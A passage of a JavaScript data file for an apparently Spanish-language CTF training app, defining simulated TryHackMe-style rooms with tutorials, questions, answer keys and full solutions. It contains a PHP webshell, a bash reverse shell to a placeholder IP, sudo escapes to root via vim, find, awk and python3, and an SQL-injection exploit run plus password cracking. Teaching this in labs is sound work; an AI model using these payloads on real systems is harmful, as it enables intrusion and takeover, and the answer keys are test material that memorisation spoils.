        "config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'webapp';\n$db_pass = 'W3bApp_DB_2024!';\n// SSH developer: Dev3lop3r_P4ss!\n// No commitear esto!\n?>",
        "shell.php": "<?php system($_GET['cmd']); ?>\n// Webshell subida exitosamente",
        "user.txt": "THM{w3bsh3ll_t0_r3v3rs3_sh3ll}",
        ".bash_history": "ls -la\ncat /var/www/html/config.php\nsudo -l\nfind / -perm -4000 2>/dev/null\n",
        "passwd": "root:x:0:0:root:/root:/bin/bash\ndeveloper:x:1001:1001::/home/developer:/bin/bash\nwww-data:x:33:33::/var/www:/nologin",
        "hostname": "webshell-box",
        "root.txt": "THM{full_c0mpr0m1s3d_s3rv3r}",
        "crontab": "*/5 * * * * root /usr/bin/python3 /opt/monitor.py"
      },
      sudo_config: "(ALL) NOPASSWD: /usr/bin/python3",
      suid_binarios: ["/usr/bin/find", "/usr/bin/sudo", "/usr/bin/passwd"]
    },

    solucion_completa: `# Solución — Reverse Shell & Webshell
# Webshell: <?php system($_GET['cmd']); ?>
# URL: http://10.10.30.30/uploads/shell.php?cmd=id
nc -lnvp 4444                             # listener
# Payload: bash -c "bash -i >& /dev/tcp/TU_IP/4444 0>&1"
python3 -c 'import pty;pty.spawn("/bin/bash")'  # mejorar shell
cat /var/www/html/config.php              # Dev3lop3r_P4ss!
# ssh developer@localhost → contraseña: Dev3lop3r_P4ss!
cat /home/developer/user.txt              # THM{w3bsh3ll_t0_r3v3rs3_sh3ll}
sudo -l                                   # (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'
cat /root/root.txt                        # THM{full_c0mpr0m1s3d_s3rv3r}`
  },

  // ──────────────────────────────────────────────────────────
  // SALA 5 — SIMPLE CTF
  // ──────────────────────────────────────────────────────────
  {
    id: "simple-ctf",
    nombre: "Simple CTF",
    descripcion: "Sala completa de principio a fin. Reconocimiento, FTP anónimo, CMS vulnerable, SSH y escalada.",
    dificultad: "Medio",
    xp: 600,
    tiempo: "90 min",
    color: "#a78bfa",
    icon: "🏆",
    tags: ["CTF Completo", "FTP", "CMS", "SSH", "Privesc"],
    historia: `Esta es tu primera sala CTF completa.
Aplica toda la metodología aprendida desde cero.

IP: 10.10.50.50
Sin credenciales iniciales.
Objetivo: user.txt + root.txt

Metodología:
1. Reconocimiento (nmap)
2. Enumeración (FTP, web)
3. Explotación (CMS vulnerable)
4. Escalada (sudo vim)`,

    preparacion: {
      titulo: "Antes de empezar — Simple CTF",
      descripcion: "Esta es la sala más completa. Repasa TODAS las técnicas antes de entrar. Es la que más se parece a una sala real de TryHackMe:",
      secciones: [
        {
          titulo: "Metodología CTF completa",
          icono: "🗺️",
          color: "#a78bfa",
          contenido: `El proceso estándar para cualquier CTF Linux:

FASE 1 — RECONOCIMIENTO
nmap -sV IP
→ ¿Qué puertos están abiertos? ¿Qué versiones corren?

FASE 2 — ENUMERACIÓN
Según lo que encontró nmap:
• Puerto 21 (FTP) → login anónimo
• Puerto 80 (HTTP) → gobuster, robots.txt, código fuente
• Puerto 445 (SMB) → enum4linux

FASE 3 — EXPLOTACIÓN
→ Buscar exploits para las versiones encontradas
→ searchsploit nombre_servicio version

FASE 4 — POST-EXPLOTACIÓN
→ id, sudo -l, find SUID, crontab

FASE 5 — ESCALADA
→ Explotar vector encontrado

FASE 6 — FLAGS
→ cat /home/*/user.txt
→ cat /root/root.txt`
        },
        {
          titulo: "FTP anónimo",
          icono: "📁",
          color: "#38bdf8",
          contenido: `Muchos servidores FTP permiten login sin contraseña.

Conectar al FTP:
ftp 10.10.50.50

Cuando pide usuario escribe: anonymous
Cuando pide contraseña presiona Enter (vacío)

230 Login successful. → ¡Acceso concedido!

Comandos dentro de FTP:
ls          → listar archivos
get archivo → descargar archivo
bye         → salir

Nota: Si hay un archivo de texto, descárgalo.
Puede contener credenciales o pistas importantes.`
        },
        {
          titulo: "CMS y exploits",
          icono: "💥",
          color: "#f43f5e",
          contenido: `Un CMS (Content Management System) es un software para
gestionar sitios web (WordPress, Joomla, Drupal, etc).

Si nmap detecta un CMS con versión específica:
1. Busca exploits con searchsploit:
   searchsploit cms made simple 2.2.8

2. El resultado mostrará exploits disponibles:
   CMS Made Simple < 2.2.10 - SQL Injection | 46635.py

3. Ejecutar el exploit:
   python3 46635.py -u http://10.10.50.50/simple

4. Resultado: hash de contraseña del admin

5. Crackear el hash:
   john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   → Resultado: secret`
        },
        {
          titulo: "Crackear contraseñas",
          icono: "🔓",
          color: "#f59e0b",
          contenido: `Cuando obtienes un hash de contraseña, necesitas crackearlo.

john the Ripper (para /etc/shadow):
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
john --show combined.txt

Para hashes sueltos:
echo "0c01f4468bd75d7a84c7eb73846e8d96" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

hashcat (más rápido con GPU):
hashcat -m 0 hash.txt rockyou.txt     # MD5
hashcat -m 1800 hash.txt rockyou.txt  # SHA-512 Unix

rockyou.txt tiene 14 millones de contraseñas reales.
La mayoría de contraseñas CTF están ahí.`
        },
        {
          titulo: "GTFOBins — Escalar con cualquier binario",
          icono: "📖",
          color: "#4ade80",
          contenido: `GTFOBins (gtfobins.github.io) es una referencia que muestra
cómo explotar binarios Unix para escalar privilegios.

Si sudo -l muestra que puedes ejecutar vim:
sudo vim -c ':!/bin/bash'
→ ¡Root!

Si puedes ejecutar find:
sudo find . -exec /bin/sh \; -quit

Si puedes ejecutar python3:
sudo python3 -c 'import os; os.system("/bin/bash")'

Si puedes ejecutar awk:
sudo awk 'BEGIN {system("/bin/sh")}'

La lógica es siempre la misma:
el binario tiene una funcionalidad que permite ejecutar
comandos del sistema → la usas para abrir una shell de root.`
        },
        {
          titulo: "Metodología específica para esta sala",
          icono: "✅",
          color: "#a78bfa",
          contenido: `Para Simple CTF sigue exactamente esto:

1. nmap -sV 10.10.50.50
   → Verás: 21 (FTP), 80 (HTTP + CMS), 2222 (SSH)

2. ftp 10.10.50.50 → anonymous → ls → get ForMitch.txt
   → Credenciales: mitch:simple_password

3. gobuster dir -u http://10.10.50.50 -w common.txt
   → Encuentra /simple (directorio del CMS)

4. searchsploit cms made simple 2.2.8
   → CVE-2019-9053 SQL Injection

5. python3 46635.py -u http://10.10.50.50/simple
   → Hash: 0c01f4468bd75d7a84c7eb73846e8d96

6. john hash.txt → secret (la contraseña)

7. ssh mitch@10.10.50.50 -p 2222 → contraseña: secret
   cat /home/mitch/user.txt

8. sudo -l → (ALL) NOPASSWD: /usr/bin/vim
   sudo vim -c ':!/bin/bash'
   cat /root/root.txt`
        }
      ],
      comandos_clave: [
        { cmd: "nmap -sV 10.10.50.50", desc: "Reconocimiento inicial completo" },
        { cmd: "ftp 10.10.50.50", desc: "Conectar a FTP (usuario: anonymous)" },
        { cmd: "searchsploit cms made simple 2.2.8", desc: "Buscar exploits del CMS" },
        { cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", desc: "Crackear hash" },
        { cmd: "sudo vim -c ':!/bin/bash'", desc: "Escalar a root con vim" }
      ]
    },

    tareas: [
      {
        id: 1,
        titulo: "Task 1 — Reconocimiento",
        descripcion: "Escanea la máquina y determina todos los servicios.",
        preguntas: [
          { pregunta: "¿Cuántos puertos están abiertos?", respuesta: "3", pista: "nmap -sV 10.10.50.50 — cuenta los puertos con estado 'open'" },
          { pregunta: "¿En qué puerto corre FTP?", respuesta: "21", pista: "nmap -sV 10.10.50.50 — busca el servicio ftp" },
          { pregunta: "¿Permite login anónimo el FTP? (si/no)", respuesta: "si", pista: "ftp 10.10.50.50 → usuario: anonymous → Enter en contraseña" },
          { pregunta: "¿Qué CMS corre en el puerto 80?", respuesta: "CMS Made Simple 2.2.8", pista: "El output de nmap muestra el CMS en http-generator" }
        ]
      },
      {
        id: 2,
        titulo: "Task 2 — Enumeración",
        descripcion: "Enumera el FTP y el servidor web para encontrar credenciales.",
        preguntas: [
          { pregunta: "¿Qué archivo encontraste en FTP?", respuesta: "ForMitch.txt", pista: "ftp 10.10.50.50 → anonymous → ls → hay un archivo .txt" },
          { pregunta: "¿Qué credenciales tiene ForMitch.txt?", respuesta: "mitch:simple_password", pista: "get ForMitch.txt → bye → cat ForMitch.txt" },
          { pregunta: "¿Qué directorio del CMS encontró gobuster?", respuesta: "/simple", pista: "gobuster dir -u http://10.10.50.50 -w /usr/share/seclists/Discovery/Web-Content/common.txt" }
        ]
      },
      {
        id: 3,
        titulo: "Task 3 — Explotación CMS",
        descripcion: "CMS Made Simple 2.2.8 tiene CVE-2019-9053 (SQLi). Explótalo.",
        preguntas: [
          { pregunta: "¿Cuál es el CVE de la vulnerabilidad?", respuesta: "CVE-2019-9053", pista: "searchsploit cms made simple 2.2.8 — busca el número CVE" },
          { pregunta: "¿Cuál es el hash MD5 extraído por el exploit?", respuesta: "0c01f4468bd75d7a84c7eb73846e8d96", pista: "python3 46635.py -u http://10.10.50.50/simple" },
          { pregunta: "¿Cuál es la contraseña crackeada?", respuesta: "secret", pista: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt" }
        ]
      },
      {
        id: 4,
        titulo: "Task 4 — Acceso y flags",
        descripcion: "Usa las credenciales para SSH y escala a root.",
        preguntas: [
          { pregunta: "¿Con qué usuario accedes por SSH?", respuesta: "mitch", pista: "Las credenciales de ForMitch.txt: mitch → contraseña crackeada" },
          { pregunta: "¿Cuál es la user flag?", respuesta: "THM{s1mpl3_ctf_us3r_fl4g}", pista: "ssh mitch@10.10.50.50 -p 2222 → cat /home/mitch/user.txt" },
          { pregunta: "¿Qué binario puedes ejecutar con sudo?", respuesta: "/usr/bin/vim", pista: "sudo -l como usuario mitch" },
          { pregunta: "¿Cuál es la root flag?", respuesta: "THM{s1mpl3_ctf_r00t_fl4g_c0mpl3t3d}", pista: "sudo vim -c ':!/bin/bash' → cat /root/root.txt" }
        ]
      }
    ],

    sistema: {
      usuario: "mitch", hostname: "simple-ctf",
      directorio_inicial: "/home/mitch",
      archivos: {
        "/home/mitch": ["user.txt", ".bash_history", ".viminfo"],
        "/home/sunbath": ["user_bak.txt"],
        "/var/www/html/simple": ["index.php", "admin/", "uploads/"],
        "/etc": ["passwd", "shadow", "hostname", "crontab"],
        "/root": ["root.txt", ".bash_history"],
        "/tmp": [], "/ftp": ["ForMitch.txt"]
      },
      contenido: {
        "user.txt": "THM{s1mpl3_ctf_us3r_fl4g}",
        ".bash_history": "sudo -l\nsudo vim -c ':!/bin/bash'\ncat /root/root.txt\n",
        "ForMitch.txt": "Mitch,\nRecuerda que tu contraseña nueva es: simple_password\nCambiala pronto.\n\nAdmin",
        "passwd": "root:x:0:0:root:/root:/bin/bash\nmitch:x:1001:1001::/home/mitch:/bin/bash\nsunbath:x:1002:1002::/home/sunbath:/bin/bash\nwww-data:x:33:33::/var/www:/nologin",
        "shadow": "root:$6$salt$hash_root:18000::\nmitch:$1$aaa$0c01f4468bd75d7a84c7eb73846e8d96:18500::\nsunbath:$6$salt$hash_sun:18500::",
        "hostname": "simple-ctf",
        "root.txt": "THM{s1mpl3_ctf_r00t_fl4g_c0mpl3t3d}",
        "crontab": "*/10 * * * * root /usr/bin/python3 /opt/cleanup.py"
      },
      nmap_output: `Starting Nmap 7.93
Nmap scan report for 10.10.50.50

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
80/tcp   open  http    Apache httpd 2.4.18
|_http-generator: CMS Made Simple
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu

Service detection performed.`,
      gobuster_output: `/index.html   (Status: 200)
/simple       (Status: 301)
/robots.txt   (Status: 200)`,
      sudo_config: "(ALL) NOPASSWD: /usr/bin/vim",
      suid_binarios: ["/usr/bin/sudo", "/usr/bin/passwd", "/usr/bin/newgrp"]
    },

    solucion_completa: `# Solución completa — Simple CTF
nmap -sV 10.10.50.50                    # 3 puertos: 21, 80, 2222
ftp 10.10.50.50                         # anonymous login
# ls → ForMitch.txt → get ForMitch.txt
cat ForMitch.txt                        # mitch:simple_password
gobuster dir -u http://10.10.50.50 -w wordlist
# Encuentra /simple
searchsploit cms made simple 2.2.8      # CVE-2019-9053
python3 46635.py -u http://10.10.50.50/simple
# Hash: 0c01f4468bd75d7a84c7eb73846e8d96
john --wordlist=rockyou.txt hash.txt    # secret
ssh mitch@10.10.50.50 -p 2222          # contraseña: secret
cat /home/mitch/user.txt               # THM{s1mpl3_ctf_us3r_fl4g}
sudo -l                                 # (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'              # ROOT!
cat /root/root.txt                      # THM{s1mpl3_ctf_r00t_fl4g_c0mpl3t3d}`
  }
];

export default THM_SALAS;
